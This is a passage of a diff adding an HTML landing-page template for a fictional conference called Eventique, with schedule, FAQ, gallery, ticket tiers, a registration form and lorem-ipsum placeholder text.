+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="scheduleeleven">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapseeleven" aria-expanded="false" aria-controls="colapseeleven">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>13<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Course Introduction: Principles of good hierarchy in web design</span>
+                                                <span class="aut-s">by Michael Smith</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapseeleven" class="panel-collapse collapse" role="tabpanel" aria-labelledby="scheduleeleven">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>
+
+                            <div class="panel panel-schedule">
+                                <div class="panel-heading" role="tab" id="scheduletwelve">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapsetwelve" aria-expanded="false" aria-controls="colapsetwelve">
+
+                                        <!-- ========================= SCHEDULE ACCORDION BLOCK TITLE ==== -->
+                                            <span class="wrap-s">
+                                            <span class="time-s"><span>14<span>30</span></span></span> 
+                                            <span class="content-s">
+                                                <span class="title-s">Conclusions of the day</span>
+                                                <span class="aut-s">John Doe</span>
+                                            </span>
+                                            </span>
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapsetwelve" class="panel-collapse collapse" role="tabpanel" aria-labelledby="scheduletwelve">
+                                    <div class="panel-body">
+
+                                        <!-- =========================== SCHEDULE ACCORDION BLOCK DESC ========================== -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                            
+                                    </div>
+                                </div>
+                            </div>                
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </section>
+
+        <!-- ================= END SCHEDULE ================= -->
+
+        <!-- ================= TESTIMONIALS ================= -->
+
+        <section id="testimonials" class="ev text-car part">
+
+
+                    <div id="text-car" class="carousel carousel-text slide" data-ride="carousel">
+
+                      <!-- Wrapper for slides -->
+                      <div class="carousel-inner" role="listbox">
+                        <div class="item active parallax">
+                            <div class="cont">
+
+                            <!-- ================= TESTIMONIALS DESC ================= -->
+
+                                <div class="text-a">
+
+                                <p>"Sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat."</p>
+
+                                    <h2> <strong>Vede Emanuel</strong> | Graphic Designer</h2>
+
+                                </div>
+
+                            </div>
+                          </div>
+
+                          <div class="item  parallax">
+                            <div class="cont">
+
+                            <!-- ================= TESTIMONIALS DESC ================= -->
+
+                                <div class="text-a">
+
+                                <p>"Sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat."</p>
+
+                                    <h2> <strong>Tufan Ovidiu</strong> | Front-End Developer</h2>
+
+                                </div>
+
+                            </div>
+                          </div>
+                        </div>
+                        <div class="item">
+                            <div class="cont">
+
+                            <!-- ================= TESTIMONIALS DESC ================= -->
+
+                                <p>Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat Sed diam nonummy nibh euismod tincidunt ut laoreet dolore magna aliquam erat volutpat. Ut wisi enim ad minim veniam, quis nostrud exerci tation ullamcorper suscipit lobortis nisl ut aliquip ex ea commodo consequat.</p>
+
+                            </div>
+                        </div>
+                      </div>
+
+                      <!-- Controls -->
+                      <a class="left carousel-control" href="#text-car" role="button" data-slide="prev">
+                        <i class="fa fa-angle-left"></i>
+                      </a>
+                      <a class="right carousel-control" href="#text-car" role="button" data-slide="next">
+                        <i class="fa fa-angle-right"></i>
+                      </a>
+ 
+
+        </section>
+
+        <!-- ================= END TESTIMONIALS ================= -->
+
+        <!-- ================= F.A.Q. ================= -->
+
+        <section id="faq" class="part faq">
+
+                        <div class="content-part">
+
+            <div class="container-fluid">
+
+                <div class="row">
+
+                    <div class="col-lg-12 col-md-12 col-xs-12 col-sm-12">
+
+                            <div class="title">
+
+                                <!-- ================= F.A.Q. TITLE ================= -->
+
+                                <h2>Frequently Asked<strong> Questions</strong></h2>
+
+                            </div>
+
+                    </div>
+
+                    <div class="col-lg-6 col-md-6 col-xs-12 col-sm-12">
+
+                        <!-- ================= F.A.Q. ACCORDION BLOCKS ================= -->
+
+                        <div class="panel-group" id="accordion" role="tablist" aria-multiselectable="true">
+
+                            <!-- ================= F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <div class="panel panel-event">
+                                <div class="panel-heading" role="tab" id="headingOneA">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapsoneA" aria-expanded="false" aria-controls="colapsoneA">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK TITLE ================= -->
+
+                                          How do I get tickets?
+
+                                        </a>
+                                  </h4>
+                                </div>
+                                <div id="colapsoneA" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOneA">
+                                    <div class="panel-body">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK DESC ================= -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                    
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================= END F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <!-- ================= F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <div class="panel panel-event">
+                                <div class="panel-heading" role="tab" id="headingTwoA">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapstwoA" aria-expanded="false" aria-controls="colapstwoA">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK TITLE ================= -->
+
+                                          Where is the event located?
+
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapstwoA" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwoA">
+                                    <div class="panel-body">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK DESC ================= -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                    
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================= END F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <!-- ================= F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <div class="panel panel-event">
+                                <div class="panel-heading" role="tab" id="headingThreeA">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapsthreeA" aria-expanded="false" aria-controls="colapsthreeA">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK TITLE ================= -->
+
+                                          Are we allowed with drinks?
+
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapsthreeA" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThreeA">
+                                    <div class="panel-body">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK DESC ================= -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                    
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================= END F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <!-- ================= F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <div class="panel panel-event">
+                                <div class="panel-heading" role="tab" id="headingFourA">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion" href="#colapsfourA" aria-expanded="false" aria-controls="colapsfourA">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK TITLE ================= -->
+
+                                          Can I bring a friend?
+
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapsfourA" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingFourA">
+                                    <div class="panel-body">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK DESC ================= -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch.
+
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================= END F.A.Q. ACCORDION BLOCK ================= -->
+
+                        </div>
+
+                        <!-- ================= END F.A.Q. ACCORDION BLOCKS ================= -->
+
+                    </div>
+
+                    <div class="col-lg-6 col-md-6 col-xs-12 col-sm-12">
+
+                        <!-- ================= END F.A.Q. ACCORDION BLOCKS ================= -->
+
+                        <div class="panel-group" id="accordion1" role="tablist" aria-multiselectable="true">
+
+                            <!-- ================= F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <div class="panel panel-event">
+                                <div class="panel-heading" role="tab" id="headingFiveA">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion1" href="#colapsfiveA" aria-expanded="false" aria-controls="colapsfiveA">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK TITLE ================= -->
+
+                                          How do I get tickets?
+
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapsfiveA" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingFiveA">
+                                    <div class="panel-body">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK DESC ================= -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                    
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================= END F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <!-- ================= F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <div class="panel panel-event">
+                                <div class="panel-heading" role="tab" id="headingSixA">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion1" href="#colapssixA" aria-expanded="false" aria-controls="colapssixA">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK TITLE ================= -->
+
+                                          Where is the event located?
+
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapssixA" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingSixA">
+                                    <div class="panel-body">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK DESC ================= -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                    
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================= END F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <!-- ================= F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <div class="panel panel-event">
+                                <div class="panel-heading" role="tab" id="headingSevenA">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion1" href="#colapssevenA" aria-expanded="false" aria-controls="colapssevenA">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK TITLE ================= -->
+
+                                          Are we allowed with drinks?
+
+                                        </a>
+                                  </h4>
+                                </div>
+                                <div id="colapssevenA" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingSevenA">
+                                    <div class="panel-body">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK DESC ================= -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch. Food truck quinoa nesciunt laborum eiusmod.
+                                    
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================= END F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <!-- ================= F.A.Q. ACCORDION BLOCK ================= -->
+
+                            <div class="panel panel-event">
+                                <div class="panel-heading" role="tab" id="headingEightA">
+                                    <h4 class="panel-title">
+                                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion1" href="#colapseightA" aria-expanded="false" aria-controls="colapseight">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK TITLE ================= -->
+
+                                          Can I bring a friend?
+
+                                        </a>
+                                    </h4>
+                                </div>
+                                <div id="colapseightA" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingEightA">
+                                    <div class="panel-body">
+
+                                        <!-- ================= F.A.Q. ACCORDION BLOCK DESC ================= -->
+
+                                        Anim pariatur cliche reprehenderit, enim eiusmod high life accusamus terry richardson ad squid. 3 wolf moon officia aute, non cupidatat skateboard dolor brunch.
+
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- ================= END F.A.Q. ACCORDION BLOCK ================= -->
+
+                        </div>
+
+                        <!-- ================= F.A.Q. ACCORDION BLOCKS ================= -->
+
+                    </div>
+
+                </div>
+
+            </div>
+
+         </div>
+
+        </section>
+
+        <!-- ================= F.A.Q. ================= -->
+
+        <!-- ================= GALLERY ================= -->
+
+        <section id="gallery" class="ev part carousel-part">
+
+            <div class="container-fluid">
+
+            <div class="content-part">
+
+                 <div class="title">
+
+                    <!-- ======================== F.A.Q. TITLE ========================= -->
+
+                    <h2>Event<strong> Gallery</strong></h2>
+
+                </div>
+
+                <ul class="nav nav-pills nav-justified">
+
+                    <li class="active"><a data-toggle="tab" href="#sectionC">Photo</a></li>
+                    <li><a data-toggle="tab" href="#sectionD">Video</a></li>
+
+                </ul>
+
+                <div class="tab-content">
+                        
+                    <div id="sectionC" class="tab-pane fade in active">
+
+                        <div id="carousel-center" class="carousel slide" data-ride="carousel" data-interval="false">
+                            <div class="carousel-inner">
+                                <div class="item active">
+                                <!-- ======================== Image ========================= -->
+                                    <img src="images/slide-mid.jpg" alt="1.jpg" class="img-responsive">
+                                </div>
+                                <div class="item">
+                                <!-- ======================== Image ========================= -->
+                                    <img src="images/slide-mid-2.jpg" alt="1.jpg" class="img-responsive">
+                                </div>
+                                <div class="item">
+                                <!-- ======================== Image ========================= -->
+                                    <img src="images/slide-mid-3.jpg" alt="1.jpg" class="img-responsive">
+                                </div>
+                                <div class="item">
+                                <!-- ======================== Image ========================= -->
+                                    <img src="images/slide-mid-4.jpg" alt="1.jpg" class="img-responsive">
+                                </div>
+                                <div class="item">
+                                <!-- ======================== Image ========================= -->
+                                    <img src="images/slide-mid-5.jpg" alt="1.jpg" class="img-responsive">
+                                </div>
+                                <div class="item">
+                                <!-- ======================== Image ========================= -->
+                                    <img src="images/slide-mid-6.jpg" alt="1.jpg" class="img-responsive">
+                                </div>
+                                <div class="item">
+                                <!-- ======================== Image ========================= -->
+                                    <img src="images/slide-mid-7.jpg" alt="1.jpg" class="img-responsive">
+                                    <!-- ======================== Caption ========================= -->
+                                </div>
+                                <div class="item">
+                                <!-- ======================== Image ========================= -->
+                                    <img src="images/slide-mid-8.jpg" alt="1.jpg" class="img-responsive">
+                                </div>
+                            </div>
+                        </div> 
+                        <div class="clearfix">
+                            <div id="thumbcarousel" class="thumbnails-carousel carousel slide" data-interval="false">
+                                <div class="carousel-inner">
+                                    <div class="item active">
+
+                                        <div data-target="#carousel-center" data-slide-to="0" class="thumb">
+                                            <!-- ======================== Thumb Image ========================= -->
+                                            <img src="images/slide-mid.jpg" alt="1.jpg" class="img-responsive">
+                                            <!-- ======================== Caption ========================= -->
+                                            <div class="caption">
+                                                <p>Marketing and Design</p>
+                                            </div>
+                                        </div>
+
+                                        <div data-target="#carousel-center" data-slide-to="1" class="thumb">
+                                        <!-- ======================== Thumb Image ========================= -->
+                                            <img src="images/slide-mid-2.jpg" alt="1.jpg" class="img-responsive">
+                                        </div>
+
+                                        <div data-target="#carousel-center" data-slide-to="2" class="thumb">
+                                        <!-- ======================== Thumb Image ========================= -->
+                                            <img src="images/slide-mid-3.jpg" alt="1.jpg" class="img-responsive">
+                                            <!-- ======================== Caption ========================= -->
+                                            <div class="caption">
+                                                <p>Marketing and Design</p>
+                                            </div>
+                                        </div>
+
+                                        <div data-target="#carousel-center" data-slide-to="3" class="thumb">
+                                        <!-- ======================== Thumb Image ========================= -->
+                                            <img src="images/slide-mid-4.jpg" alt="1.jpg" class="img-responsive">
+                                        </div>
+
+                                    </div><!-- /item -->
+                                    <div class="item">
+                                        <div data-target="#carousel-center" data-slide-to="4" class="thumb">
+                                        <!-- ======================== Thumb Image ========================= -->
+                                            <img src="images/slide-mid-5.jpg" alt="1.jpg" class="img-responsive">
+                                        </div>
+                                        <div data-target="#carousel-center" data-slide-to="5" class="thumb">
+                                        <!-- ======================== Thumb Image ========================= -->
+                                            <img src="images/slide-mid-6.jpg" alt="1.jpg" class="img-responsive">  
+                                            <!-- ======================== Caption ========================= -->
+                                            <div class="caption">
+                                                <p>Marketing and Design</p>
+                                            </div>               
+                                        </div>
+                                        <div data-target="#carousel-center" data-slide-to="6" class="thumb">
+                                        <!-- ======================== Thumb Image ========================= -->
+                                            <img src="images/slide-mid-7.jpg" alt="1.jpg" class="img-responsive">  
+                                        </div>
+                                        <div data-target="#carousel-center" data-slide-to="7" class="thumb">
+                                        <!-- ======================== Thumb Image ========================= -->
+                                            <img src="images/slide-mid-8.jpg" alt="1.jpg" class="img-responsive">  
+                                            <!-- ======================== Caption ========================= -->
+                                            <div class="caption">
+                                                <p>Marketing and Design</p>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                </div>
+
+                                <a class="left carousel-control" href="#thumbcarousel" role="button" data-slide="prev">
+                                    <i class="fa fa-angle-left"></i>
+                                </a>
+                                <a class="right carousel-control" href="#thumbcarousel" role="button" data-slide="next">
+                                    <i class="fa fa-angle-right"></i>
+                                </a>
+                            </div> <!-- /thumbcarousel -->
+                        </div>
+                    </div>
+
+                    <div id="sectionD" class="tab-pane fade in">
+
+                            <div class=" text-center media-video">
+                                <div class="video-wrapper">
+                                    <iframe width="1090" height="535" src="http://www.youtube.com/embed/eIho2S0ZahI" allowfullscreen=""></iframe>
+                                 </div>
+                            </div>
+
+                        <div class="clearfix">
+                            <div id="thumbcarousel1" class="thumbnails-carousel carousel video-c slide" data-interval="false">
+                                <div class="carousel-inner">
+                                    <div class="item active">
+
+                                        <div data-target="#carousel-video" data-slide-to="0" data-video-url="https://www.youtube.com/embed/URy4fN4sSqI" class="thumb play-video">
+                                            <!-- ======================== Thumb Video ========================= -->
+                                            <img src="images/slide-mid-9.jpg" alt="1.jpg" class="img-responsive">
+                                            <!-- ======================== Caption ========================= -->
+                                            <div class="caption">
+                                                <p>Marketing and Design</p>
+                                            </div>
+                                        </div>
+
+                                        <div data-target="#carousel-video" data-slide-to="1" data-video-url="https://www.youtube.com/embed/nFxWSTYHRQ4" class="thumb play-video">
+                                        <!-- ======================== Thumb Video ========================= -->
+                                            <img src="images/slide-mid-10.jpg" alt="1.jpg" class="img-responsive">
+                                        </div>
+
+                                        <div data-target="#carousel-video" data-slide-to="2" data-video-url="https://www.youtube.com/embed/IkGtWhUmbqM" class="thumb play-video">
+                                        <!-- ======================== Thumb Video ========================= -->
+                                            <img src="images/slide-mid-11.jpg" alt="1.jpg" class="img-responsive">
+                                            <!-- ======================== Caption ========================= -->
+                                            <div class="caption">
+                                                <p>Marketing and Design</p>
+                                            </div>
+                                        </div>
+
+                                        <div data-target="#carousel-video" data-slide-to="3" data-video-url="https://www.youtube.com/embed/V8K_kDt0Ow8" class="thumb play-video">
+                                        <!-- ======================== Thumb Video ========================= -->
+                                            <img src="images/slide-mid-12.jpg" alt="1.jpg" class="img-responsive">
+                                        </div>
+
+                                    </div><!-- /item -->
+                                    <div class="item">
+
+                                        <div data-video-url="https://www.youtube.com/embed/URy4fN4sSqI" class="thumb play-video">
+                                            <!-- ======================== Thumb Video ========================= -->
+                                            <img src="images/slide-mid-9.jpg" alt="1.jpg" class="img-responsive">
+                                            <!-- ======================== Caption ========================= -->
+                                            <div class="caption">
+                                                <p>Marketing and Design</p>
+                                            </div>
+                                        </div>
+
+                                        <div data-video-url="https://www.youtube.com/embed/nFxWSTYHRQ4" class="thumb play-video">
+                                        <!-- ======================== Thumb Video ========================= -->
+                                            <img src="images/slide-mid-10.jpg" alt="1.jpg" class="img-responsive">
+                                        </div>
+
+                                        <div data-video-url="https://www.youtube.com/embed/IkGtWhUmbqM" class="thumb play-video">
+                                        <!-- ======================== Thumb Video ========================= -->
+                                            <img src="images/slide-mid-11.jpg" alt="1.jpg" class="img-responsive">
+                                            <!-- ======================== Caption ========================= -->
+                                            <div class="caption">
+                                                <p>Marketing and Design</p>
+                                            </div>
+                                        </div>
+
+                                        <div data-video-url="https://www.youtube.com/embed/V8K_kDt0Ow8" class="thumb play-video">
+                                        <!-- ======================== Thumb Video ========================= -->
+                                            <img src="images/slide-mid-12.jpg" alt="1.jpg" class="img-responsive">
+                                        </div>
+
+                                    </div>
+                                </div>
+                                <a class="left carousel-control" href="#thumbcarousel1" role="button" data-slide="prev">
+                                    <i class="fa fa-angle-left"></i>
+                                </a>
+                                <a class="right carousel-control" href="#thumbcarousel1" role="button" data-slide="next">
+                                    <i class="fa fa-angle-right"></i>
+                                </a>
+                            </div>
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+            </div>
+
+
+        </section>
+
+        <!-- ================= END GALLERY ================= -->
+
+        <!-- ================= SPONSORS ================= -->
+
+        <section class="part conf-logo">
+
+            <div class="container-fluid">
+
+                <h2> Sponsor Logos </h2> <!-- = Title just for SEO = -->
+          
+            <div id="event-slider">
+
+            <!-- ================= SPONSORS LOGOS ================= -->
+
+              <img src="images/logo-conf.jpg" title="Conference" alt="conference" />
+              <img src="images/logo-conf-2.jpg" title="Conference" alt="conference" />
+              <img src="images/logo-conf-3.jpg" title="Conference" alt="conference" />
+              <img src="images/logo-conf-4.jpg" title="Conference" alt="conference" />
+              <img src="images/logo-conf.jpg" title="Conference" alt="conference" />
+              <img src="images/logo-conf-2.jpg" title="Conference" alt="conference" />
+              <img src="images/logo-conf-3.jpg" title="Conference" alt="conference" />
+              <img src="images/logo-conf-4.jpg" title="Conference" alt="conference" />
+             
+            </div>
+            </div>
+
+        </section>
+
+        <!-- ================= END SPONSORS ================= -->
+
+        <!-- ================= GOOGLE MAPS ================= -->
+
+        <section id="location" class="part ev map">
+
+            <h2> Event Map </h2> <!-- = Title just for SEO = -->
+
+            <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&amp;signed_in=true"></script>
+
+            <!-- ================= GOOGLE MAPS COORDINATES ================= -->
+
+            <div id="map-canvas" class="map-canvas"> </div>
+
+        </section>
+
+        <!-- ================= END GOOGLE MAPS ================= -->
+
+        <!-- ================= TICKETS ================= -->
+
+        <section class="part ticket">
+
+            <div class="container-fluid">
+
+                    <div class="content-part">
+                            <div class="title">
+
+                        <!-- ================= TICKETS TITLE ================= -->
+
+                                <h2>Get <strong>Tickets</strong></h2>
+
+                            </div>
+
+                        </div>
+
+                <div class="row">
+
+
+                            <!-- ================= TICKETS LIST BLOCK ================= -->
+
+                    <div class="col-lg-4 col-md-4 col-sm-6">
+
+                        <ul class="ticket-list">
+                            <li class="title">Silver</li>
+                            <li class="costs"><em>$</em>99</li>
+                            <li class="active">Seat</li>
+                            <li>Launch</li>
+                            <li class="last">Award Certificate</li>
+                        </ul>
+
+                    </div>
+
+                            <!-- ================= END TICKETS LIST BLOCK ================= -->
+
+                            <!-- ================= TICKETS LIST BLOCK ================= -->
+
+                    <div class="col-lg-4 col-md-4 col-sm-6">
+
+                        <ul class="ticket-list active">
+                            <li class="title">Gold</li>
+                            <li class="costs"><em>$</em>599</li>
+                            <li class="active">Seat</li>
+                            <li class="active">Launch</li>
+                            <li class="last">Award Certificate</li>
+                        </ul>
+
+                    </div>
+
+                            <!-- ================= END TICKETS LIST BLOCK ================= -->
+
+                            <!-- ================= TICKETS LIST BLOCK ================= -->
+
+
+                    <div class="col-lg-4 col-md-4 col-sm-6">
+
+                        <ul class="ticket-list">
+                            <li class="title">Platinum</li>
+                            <li class="costs"><em>$</em>999</li>
+                            <li class="active">Seat</li>
+                            <li class="active">Launch</li>
+                            <li class="active last">Award Certificate</li>
+                        </ul>
+
+                    </div>
+
+                    <!-- ================= END TICKETS LIST BLOCK ================= -->
+
+                </div>
+
+            </div>
+
+        </section>
+
+        <!-- ================= END TICKETS ================= -->
+
+        <!-- ================= SUBSCRIPTION FORM ================= -->
+
+        <section class="part register ev wow bounceInUp" data-wow-duration="0.9s" data-wow-delay="0.2s" id="register">
+
+            <div class="container-fluid">
+
+            <h2> Event Map </h2> <!-- = Title just for SEO = -->
+
+                <div id="contact-wrap">
+
+                    <form class="form-inline" method="post" id="updateForm">
+
+                        <div class="row">
+
+                            <div class="col-lg-9 col-md-9 col-xs-12 col-sm-12">
+
+                                <div class="contact-form">
+                                    <div class="contact-form-in">
+                                        <div class="form-group col-lg-4 col-md-4 col-xs-12 col-sm-6">
+                                            <input type="text" id="form-name" name="name" placeholder="Name" class="form-control">
+                                        </div>
+                                        <div class="form-group col-lg-5 col-md-5 col-xs-12 col-sm-6">
+                                            <input type="text" id="form-email" name="email" placeholder="Email" class="form-control">
+                                        </div>
+                                        <div class="form-group col-lg-3 col-md-3 col-xs-12 col-sm-12">
+                                            <select id="form-option" name="option" class="form-control options"  aria-required="true">
+                                                <!-- ================= Pricing Subscription ================= -->
+                                                <option>Gold</option>
+                                                <option>Silver</option>
+                                                <option>Platinum</option>
+                                            </select>
+                                        </div>
+                                    </div>
+                                </div>
+
+                            </div>
+
+                            <div class="col-lg-3 col-md-3 col-xs-12 col-sm-12 reg-btn">
+
+                                <div class="send-wrap">
+                                    <input type="submit" value="Register" class="btn btn-primary">
+                                </div>
+                                
+                            </div>
+
+                        </div>
+
+                    </form>
+
+                </div>
+
+                    <div id="success-wrap">
+                        <div class="content-width">
+                            <div class="success">
+                                <p>Thank you, your message has been sent!</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div id="error-wrap">
+                        <div class="content-width">
+                            <div class="success">
+                                <p>Your message could not be sent! Please try again!</p>
+                            </div>
+                        </div>
+                    </div>
+
+            </div>
+
+        </section>
+
+        <!-- ================= END SUBSCRIPTION FORM ================= -->
+
+        <!-- ================= FOOTER ================= -->
+
+        <section class="part contact" >
+
+            <div class="container-fluid">
+
+                <div class="row">
+
+                    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
+
+                        <div class="title">
+
+                        <!-- ================= FOOTER TITLE ================= -->
+
+                            <h2>Contact <strong>Us</strong></h2>
+
+                        </div>
+
+                    </div>
+
+                    <div class="col-lg-3 col-md-3 col-sm-6 col-xs-12">
+
+                        <!-- ================= FOOTER CONTACT INFO ================= -->
+
+                        <p>Email | <a href="mailto:contact@eventique.com">contact@eventique.com</a></p>
+
+                    </div>
+
+                    <div class="col-lg-3 col-md-2 col-sm-6 col-xs-12">
+
+                        <!-- ================= FOOTER CONTACT INFO ================= -->
+
+                        <p>Phone | <a href="tel:0123456789">+40.123.456.789</a></p>
+
+                    </div>
+
+                    <div class="col-lg-3 col-md-4 col-sm-6 col-xs-12">
+
+                        <!-- ================= FOOTER SOCIAL MEDIA ================= -->
+
+                        <ul class="social-media">
+                            <li class="facebook"><a href="facebook.html"><i class="fa fa-facebook"></i></a>
+                            </li>
+                            <li class="instagram"><a href="instagram.html"><i class="fa fa-twitter"></i></a>
+                            </li>
+                            <li class="twitter"><a href="twitter.html"><i class="fa fa-twitter"></i></a>
+                            </li>
+                            <li class="vimeo"><a href="vimeo.html"><i class="fa fa-vimeo-square"></i></a>
+                            </li>
+                            <li class="linkedin"><a href="linkedin.html"><i class="fa fa-linkedin"></i></a>
+                            </li>
+                            <li class="youtube"><a href="youtube.html"><i class="fa fa-youtube"></i></a>
+                            </li>
+                            <li class="pinterest"><a href="pinterest.html"><i class="fa fa-pinterest"></i></a>
+                            </li>
+                        </ul>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </section>
+
+        <!-- ================= END FOOTER ================= -->
+
+    </div>
+
+    <!-- ================= END CONTENT ================= -->
+
+    <!-- ================= FOOTER WATERMARK ================= -->
+
+    <footer class="footer">
+        <p>Copyright of <a href="#"><strong>EVENTIQUE</strong></a> 2016 </p>
+    </footer>
+
+    <!-- ================= END FOOTER WATERMARK ================= -->
+
+    <!-- ================= Javascript files ================= -->
+    <script src="js/modernizr.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/jquerymobile.js"></script>
+    <script src="js/skrollr.js"></script>
+    <script src="js/SmoothScroll.js"></script>
+    <script src="js/Owl.Carousel.js"></script>
+    <script src="js/jquery.countdown.js"></script>
+    <script src="js/addtocalendar.js"></script>
+    <script src="js/jquery-validation.js"></script>
+    <script src="js/form-validation.js"></script>
